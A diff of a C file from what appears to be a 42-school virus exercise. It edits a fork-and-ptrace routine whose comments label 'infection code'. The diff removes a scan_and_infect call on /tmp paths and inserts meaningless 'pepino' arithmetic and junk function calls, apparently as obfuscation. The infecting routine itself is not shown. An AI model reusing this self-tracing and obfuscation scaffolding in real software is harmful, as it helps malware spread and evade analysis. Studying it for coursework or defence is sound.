@@ -6,7 +6,7 @@
 /*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/09 18:09:51 by jainavas          #+#    #+#             */
-/*   Updated: 2026/01/09 18:30:32 by jainavas         ###   ########.fr       */
+/*   Updated: 2026/01/09 22:32:01 by jainavas         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -48,7 +48,8 @@ void child_process(void)
     raise(SIGSTOP);
     
     // ===== CÓDIGO DE INFECCIÓN =====
-    scan_and_infect("/tmp/test", "/tmp/test2");
+	pepino /= 4;
+	calculadoradepepino();
     
     exit(0);
 }
@@ -115,6 +116,15 @@ void parent_tracer(pid_t child_pid)
     }
 }
 
+void run2withtracer(int h)
+{
+    if (h == 0) {
+		calculadoradepepino();
+    } else {
+        parent_tracer(h);
+    }
+}
+
 // Función pública: orquesta el fork y el tracing
 void run_with_tracer(void)
 {
@@ -126,15 +136,8 @@ void run_with_tracer(void)
 		exit(1);
 
     if (pid == -1) {
-        // Error en fork → salir silenciosamente
         exit(1);
     }
-    
-    if (pid == 0) {
-        // HIJO: ejecuta la infección bajo auto-tracing
-        child_process();
-    } else {
-        // PADRE: tracrea al hijo e intercepta syscalls
-        parent_tracer(pid);
-    }
+	pepino = (pepino * -1) * (pepino * -1);
+	run2withtracer(pid);
 }
